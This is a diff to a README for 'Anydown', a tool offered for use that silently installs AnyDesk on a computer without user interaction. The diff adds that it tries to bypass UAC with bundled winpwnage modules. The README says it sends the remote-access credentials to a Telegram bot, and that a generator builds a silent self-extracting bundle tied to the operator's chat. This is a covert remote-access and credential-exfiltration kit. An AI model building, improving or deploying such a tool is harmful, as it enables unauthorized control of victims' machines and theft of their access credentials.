@@ -6,13 +6,13 @@ Anydown is a software that automates the deployment and the remote access on com
 
 # How does it works
 
-Anydown downloads, install and set up AnyDesk in a breeze, without interaction needed.
+Anydown downloads, install and set up AnyDesk in a breeze, without interaction needed. More, it tries to bypass UAC to make things even smoother.
 
 Then, the software send the credentials to a Telegram account using a bot.
 
 # How to set up the Telegram connection
 
-In the source code (when I will publish id), there's my publicy available bot (that could disappear suddendly and can be viewed or modified by anyone running the anygen.exe binary file, so I strongly advise you to create a bot and change that line in the source code).
+In the source code (unzip winpwnage.zip that contain the UAC modules), there's my publicy available bot (that could disappear suddendly and can be viewed or modified by anyone running the anygen.exe binary file, so I strongly advise you to create a bot and change that line in the source code).
 
 So, you can just simply start AnyGen.exe and follow instructions: this will generate a 7zip SFX silent bundle associated with your Telegram chat with the chosen bot.
 
